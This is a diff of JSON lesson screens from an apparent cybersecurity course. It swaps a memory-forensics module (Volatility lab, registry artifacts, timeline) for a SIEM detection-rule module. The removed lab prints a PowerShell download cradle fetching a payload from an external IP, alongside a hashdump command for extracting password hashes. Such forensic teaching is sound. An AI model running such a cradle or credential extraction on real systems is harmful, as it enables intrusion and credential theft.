@@ -1,224 +1,170 @@
 [
   {
     "screen_id": 1,
-    "type": "story_hook",
-    "title": "Caso Real: Memory Forensics Reveals APT",
-    "duration": 120,
+    "type": "memory_cards",
+    "title": "SIEM Use Cases",
+    "duration": 180,
     "content": {
-      "case_name": "APT Memory-Only Malware Investigation",
-      "date": "2018",
-      "image_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/db/Computer_memory_types.svg/1200px-Computer_memory_types.svg.png",
-      "narrative": "Empresa detecta exfiltración de datos pero no encuentra malware en disco. Atacante usaba fileless malware que vivía solo en RAM. Análisis de memory dump reveló: PowerShell code injection, proceso oculto, conexiones de red activas, credenciales en cleartext. Sin memory forensics, ataque habría quedado sin resolver.",
-      "stats": [
-        {"label": "Tiempo en Memoria", "value": "6 meses", "icon": "schedule"},
-        {"label": "Archivos en Disco", "value": "0", "icon": "storage"},
-        {"label": "Detección", "value": "Memory Forensics", "icon": "memory"}
+      "cards": [
+        {
+          "id": "1",
+          "front": {
+            "icon": "login",
+            "term": "Failed Login Monitoring",
+            "color": "#D32F2F"
+          },
+          "back": {
+            "definition": "Detect brute force, credential stuffing. Multiple failed logins followed by success = compromise. Geographic anomalies.",
+            "example": "Alert: 100 failed logins to admin account from IP in Russia, then 1 success. SIEM correlates events. Target: Fazio creds from unusual location.",
+            "color": "#EF5350"
+          }
+        },
+        {
+          "id": "2",
+          "front": {
+            "icon": "cloud_upload",
+            "term": "Data Exfiltration",
+            "color": "#FF6F00"
+          },
+          "back": {
+            "definition": "Large outbound transfers to unusual destinations. DNS queries with high entropy (tunneling). Upload to cloud storage anomalies.",
+            "example": "SIEM: User uploaded 10GB to personal Dropbox in 1 hour. Baseline: User averages 10MB/day. Alert triggered. Target: Exfil to Brazil/Russia.",
+            "color": "#FFB74D"
+          }
+        },
+        {
+          "id": "3",
+          "front": {
+            "icon": "admin_panel_settings",
+            "term": "Privileged Account Activity",
+            "color": "#7B1FA2"
+          },
+          "back": {
+            "definition": "Admin accounts used outside business hours, from unusual locations, unusual commands. Service accounts login interactively (abnormal).",
+            "example": "Alert: Domain Admin account login at 3am on Saturday. Investigation: Compromised. Twitter: Internal admin tool abuse detected this way.",
+            "color": "#BA68C8"
+          }
+        },
+        {
+          "id": "4",
+          "front": {
+            "icon": "bug_report",
+            "term": "Malware C2 Detection",
+            "color": "#1976D2"
+          },
+          "back": {
+            "definition": "Beaconing: Regular intervals to external IP. DNS to known bad domains. TLS to unusual ports. HTTP POST to suspicious URLs.",
+            "example": "SIEM + Threat Intel: DNS query to domain in threat feed = alert. Colonial: DarkSide C2 beaconing could be detected.",
+            "color": "#42A5F5"
+          }
+        }
       ]
     }
   },
   {
     "screen_id": 2,
-    "type": "theory_tabs",
-    "title": "File System Forensics",
+    "type": "progress_checklist",
+    "title": "Building Detection Rules",
+    "duration": 240,
     "content": {
-      "intro": "Análisis de sistemas de archivos para recuperar evidencia y reconstruir actividad.",
-      "tabs": [
+      "items": [
         {
-          "label": "NTFS",
-          "title": "NT File System (Windows)",
-          "text": "Master File Table (MFT): registro de cada archivo. $MFT contiene metadata: nombre, tamaño, timestamps (MAC: Modified, Accessed, Created), atributos, ubicación en disco. Alternate Data Streams (ADS) pueden ocultar datos.",
-          "icon": "folder"
+          "id": "rules1",
+          "task": "Define Use Case",
+          "subtitle": "What to detect?",
+          "icon": "assignment",
+          "unlock_content": {
+            "title": "Use Case Definition",
+            "points": [
+              "Business driver: Compliance, threat intel, past incident, industry trend",
+              "Example: 'Detect ransomware lateral movement via SMB'",
+              "Success criteria: What alert looks like? Acceptable false positive rate?",
+              "Data sources needed: Which logs required?",
+              "Target example: 'Detect POS malware memory access'"
+            ],
+            "bonus_fact": "Good use case: Specific, actionable, measurable. Bad: Too broad ('detect all attacks')."
+          }
         },
         {
-          "label": "Timestamps",
-          "title": "MAC Times Analysis",
-          "text": "Modified: contenido cambió. Accessed: archivo leído (puede ser deshabilitado). Created: archivo creado (en NTFS, puede ser MFT entry creation). Birth: creación real. MACB timeline para reconstruir actividad.",
-          "icon": "schedule"
+          "id": "rules2",
+          "task": "Write Detection Logic",
+          "subtitle": "Translate to query",
+          "icon": "code",
+          "unlock_content": {
+            "title": "Rule Development",
+            "points": [
+              "SIEM query language: SPL (Splunk), KQL (Sentinel), etc",
+              "Logic: IF (condition1 AND condition2) THEN alert",
+              "Example: IF (process='powershell.exe' AND cmdline contains 'Invoke-Mimikatz') THEN High Severity Alert",
+              "Thresholds: 5+ failed logins in 10 min from single IP",
+              "Exclusions: Whitelist known good (scanner IPs, maintenance accounts)"
+            ],
+            "bonus_fact": "Start strict, tune over time. Better initial false positives than miss true threats."
+          }
         },
         {
-          "label": "Deleted Files",
-          "title": "Recuperación de Archivos Borrados",
-          "text": "Delete no borra datos, marca espacio como disponible. MFT entry marcada como deleted. Datos persisten hasta sobrescritura. File carving: buscar headers/footers conocidos (JPG, PDF, DOCX) en unallocated space.",
-          "icon": "restore_from_trash"
+          "id": "rules3",
+          "task": "Test & Validate",
+          "subtitle": "Does it work?",
+          "icon": "science",
+          "unlock_content": {
+            "title": "Rule Testing",
+            "points": [
+              "Simulate attack: Use purple team to generate events",
+              "Historical data: Replay past logs. Does rule catch known incident?",
+              "False positive check: Run against baseline. Too noisy?",
+              "Severity tuning: Critical vs High vs Medium",
+              "Target test: Replay BlackPOS logs. Does rule trigger?"
+            ],
+            "bonus_fact": "Never deploy rule to production without testing. One bad rule = alert storm = SOC down."
+          }
         },
         {
-          "label": "Artifacts",
-          "title": "Windows Artifacts",
-          "text": "Prefetch (apps ejecutadas), Shimcache (AppCompatCache - programas ejecutados), Amcache (instalación de apps), LNK files (atajos - acceso a archivos), Jump Lists, USN Journal (cambios en volumen NTFS).",
-          "icon": "inventory_2"
+          "id": "rules4",
+          "task": "Deploy & Maintain",
+          "subtitle": "Continuous improvement",
+          "icon": "update",
+          "unlock_content": {
+            "title": "Rule Lifecycle",
+            "points": [
+              "Deploy: Enable in production SIEM",
+              "Monitor: Track alert volume, false positive rate",
+              "Tune: Adjust thresholds, add exceptions, refine logic",
+              "Sunset: Disable outdated rules (threat no longer relevant)",
+              "Document: Maintain rule library with descriptions, owners"
+            ],
+            "bonus_fact": "Rule maintenance = 30-40% of detection engineering time. Old rules accumulate like code debt."
+          }
         }
       ]
     }
   },
   {
     "screen_id": 3,
-    "type": "theory_section",
-    "title": "Memory Forensics - Volatility",
-    "content": {
-      "intro": "Análisis de RAM dump para evidencia volátil: procesos, network connections, malware, credenciales.",
-      "why_important": "Fileless malware no toca disco. Vive en RAM (PowerShell, DLLs inyectadas). Process hollowing, code injection. Memory es donde ocurre la acción.",
-      "tools": {
-        "name": "Volatility Framework",
-        "description": "Open-source memory forensics. Soporta Windows, Linux, Mac. Python-based.",
-        "plugins": [
-          {
-            "plugin": "pslist / pstree",
-            "purpose": "Listar procesos en ejecución. Detectar procesos ocultos.",
-            "command": "volatility -f memory.dmp --profile=Win10x64 pslist"
-          },
-          {
-            "plugin": "netscan",
-            "purpose": "Conexiones de red activas y listening ports. Encuentra C2 connections.",
-            "command": "volatility -f memory.dmp --profile=Win10x64 netscan"
-          },
-          {
-            "plugin": "malfind",
-            "purpose": "Buscar code injection, memory segments con permisos sospechosos (RWX).",
-            "command": "volatility -f memory.dmp --profile=Win10x64 malfind"
-          },
-          {
-            "plugin": "hashdump",
-            "purpose": "Extraer password hashes de SAM (Windows).",
-            "command": "volatility -f memory.dmp --profile=Win10x64 hashdump"
-          },
-          {
-            "plugin": "cmdscan / consoles",
-            "purpose": "Comandos ejecutados en cmd.exe o PowerShell. Detecta attacker commands.",
-            "command": "volatility -f memory.dmp --profile=Win10x64 cmdscan"
-          }
-        ]
-      },
-      "analysis_workflow": [
-        "1. Identificar profile correcto (OS version)",
-        "2. Listar procesos (pslist) - buscar sospechosos",
-        "3. Analizar network (netscan) - IPs externas, puertos raros",
-        "4. Buscar code injection (malfind)",
-        "5. Extraer proceso sospechoso (procdump)",
-        "6. Analizar strings, dlls cargadas (dlllist)"
-      ]
-    }
-  },
-  {
-    "screen_id": 4,
-    "type": "theory_section",
-    "title": "Registry Forensics",
-    "content": {
-      "intro": "Windows Registry contiene configuración del sistema, users, apps instaladas. Evidencia forense rica.",
-      "hives": [
-        {"hive": "SAM", "location": "C:\\Windows\\System32\\config\\SAM", "contains": "User accounts, password hashes"},
-        {"hive": "SECURITY", "location": "C:\\Windows\\System32\\config\\SECURITY", "contains": "Security policies, cached domain credentials"},
-        {"hive": "SOFTWARE", "location": "C:\\Windows\\System32\\config\\SOFTWARE", "contains": "Installed software, autorun programs"},
-        {"hive": "SYSTEM", "location": "C:\\Windows\\System32\\config\\SYSTEM", "contains": "System config, network config, services"},
-        {"hive": "NTUSER.DAT", "location": "C:\\Users\\[user]\\NTUSER.DAT", "contains": "User-specific settings, recent docs"}
-      ],
-      "forensic_keys": [
-        {
-          "key": "Run / RunOnce",
-          "path": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-          "evidence": "Programas que ejecutan al boot. Malware usa esto para persistencia."
-        },
-        {
-          "key": "MRU (Most Recently Used)",
-          "path": "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer",
-          "evidence": "Archivos recientes, búsquedas, typed URLs."
-        },
-        {
-          "key": "USB Devices",
-          "path": "SYSTEM\\CurrentControlSet\\Enum\\USBSTOR",
-          "evidence": "USBs conectados, serial numbers, last connect time."
-        },
-        {
-          "key": "Network History",
-          "path": "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList",
-          "evidence": "Redes WiFi a las que se conectó."
-        }
-      ]
-    }
-  },
-  {
-    "screen_id": 5,
-    "type": "practical_lab",
-    "title": "Lab: Análisis de Memory Dump",
-    "content": {
-      "scenario": "Tienes memory dump de 4GB de sistema comprometido. Usa Volatility para investigar.",
-      "simulation": {
-        "memory_file": "infected.dmp",
-        "profile": "Win10x64_19041",
-        "tasks": [
-          {
-            "task": "Identificar procesos sospechosos",
-            "command": "volatility -f infected.dmp --profile=Win10x64_19041 pslist",
-            "output_excerpt": "PID 4820 - powershell.exe (PPID: 3012 - svchost.exe)\nPID 5124 - cmd.exe (PPID: 4820)\nPID 5328 - svchost.exe (no standard parent, hidden)",
-            "analysis": "PowerShell spawned by svchost es sospechoso. Cmd.exe hijo de PowerShell indica scripting. svchost con parent anómalo es red flag."
-          },
-          {
-            "task": "Analizar conexiones de red",
-            "command": "volatility -f infected.dmp --profile=Win10x64_19041 netscan",
-            "output_excerpt": "PID 5328 - svchost.exe - TCP 192.168.1.50:49234 -> 45.142.212.88:443 ESTABLISHED",
-            "analysis": "Conexión a IP externa sospechosa (Tor exit node). Puerto 443 para parecer HTTPS pero proceso es svchost anómalo."
-          },
-          {
-            "task": "Buscar code injection",
-            "command": "volatility -f infected.dmp --profile=Win10x64_19041 malfind -p 5328",
-            "output_excerpt": "Process: svchost.exe PID: 5328\nAddress: 0x02a30000\nFlags: PAGE_EXECUTE_READWRITE\nProtect: VirtualAllocEx injected",
-            "analysis": "Memory region con RWX (Read-Write-Execute) es anómalo. Indica code injection. Malware inyectó código en proceso legítimo."
-          },
-          {
-            "task": "Extraer comandos PowerShell",
-            "command": "volatility -f infected.dmp --profile=Win10x64_19041 consoles",
-            "output_excerpt": "IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.88/payload')",
-            "analysis": "PowerShell descargó y ejecutó payload remoto. Técnica de fileless malware."
-          }
-        ]
-      },
-      "conclusion": "Evidencia encontrada: Process injection, C2 connection, PowerShell download cradle. APT fileless malware confirmado."
-    }
-  },
-  {
-    "screen_id": 6,
-    "type": "theory_section",
-    "title": "Timeline Analysis",
-    "content": {
-      "concept": "Reconstruir cronología de eventos para entender secuencia de ataque.",
-      "sources": [
-        "File system timestamps (MAC times)",
-        "Registry keys (last write time)",
-        "Event logs (Security, System, Application)",
-        "Prefetch files (last execution)",
-        "Browser history",
-        "Memory artifacts"
-      ],
-      "tools": [
-        {"tool": "log2timeline / Plaso", "description": "Genera super timeline de múltiples fuentes. Output CSV/JSON."},
-        {"tool": "Timeline Explorer", "description": "Visualiza timelines, filtra eventos."}
-      ],
-      "workflow": [
-        "1. Recolectar timestamps de todas las fuentes",
-        "2. Normalizar a UTC",
-        "3. Agregar en timeline único",
-        "4. Filtrar ruido (system processes normales)",
-        "5. Identificar pivot points (primera acción sospechosa, lateral movement, exfiltración)"
-      ],
-      "example_timeline": [
-        {"time": "2024-11-20 14:23:15", "event": "phishing.docx opened by user"},
-        {"time": "2024-11-20 14:23:47", "event": "powershell.exe spawned by WINWORD.EXE"},
-        {"time": "2024-11-20 14:24:02", "event": "Connection to 45.142.212.88:443"},
-        {"time": "2024-11-20 14:35:18", "event": "Lateral movement: SMB to DC01"},
-        {"time": "2024-11-20 15:12:44", "event": "Data staged in C:\\temp\\exfil.zip"},
-        {"time": "2024-11-20 16:08:33", "event": "Large upload to 45.142.212.88"}
-      ]
-    }
-  },
-  {
-    "screen_id": 7,
     "type": "quiz",
-    "title": "Evaluación - Análisis Forense Avanzado",
+    "title": "Evaluación",
+    "duration": 60,
     "content": {
-      "question": "¿Por qué memory forensics es crítico para detectar fileless malware?",
+      "question": "SIEM rule tuning: ¿Por qué importante?",
       "options": [
-        {"id": "a", "text": "Fileless malware vive solo en RAM, no escribe archivos al disco, no detectable con disk forensics", "is_correct": true, "feedback": "Correcto. Fileless usa PowerShell, WMI, código inyectado en memoria. Sin memory dump, no hay evidencia."},
-        {"id": "b", "text": "Memory forensics es más rápido que disk forensics", "is_correct": false, "feedback": "No. Velocidad no es la razón. Es porque fileless NO está en disco."},
-        {"id": "c", "text": "Memory contiene contraseñas en cleartext", "is_correct": false, "feedback": "Parcial. Sí puede contener credenciales, pero no es la razón principal para fileless detection."}
+        {
+          "id": "a",
+          "text": "No es importante, rules son set-and-forget",
+          "is_correct": false,
+          "feedback": "Incorrecto. Opposite. Rules need constant tuning."
+        },
+        {
+          "id": "b",
+          "text": "Reduce false positives, improve detection accuracy, adapt to environment changes",
+          "is_correct": true,
+          "feedback": "CORRECTO! 1) Reduce FPs: Initial rule = noisy. Tuning adds exceptions, adjusts thresholds. 2) Improve accuracy: Attackers evolve. Rules must adapt. 3) Environment changes: New apps, new users = new baselines. 4) Alert fatigue prevention: Untuned rules = alert storm = analysts numb. Target lesson: FireEye alerts ignored partly due to alert fatigue from noisy rules. Well-tuned rules = SOC can focus on real threats."
+        },
+        {
+          "id": "c",
+          "text": "Solo para compliance",
+          "is_correct": false,
+          "feedback": "Incorrecto. Compliance es benefit pero primary goal es effective detection."
+        }
       ]
     }
   }
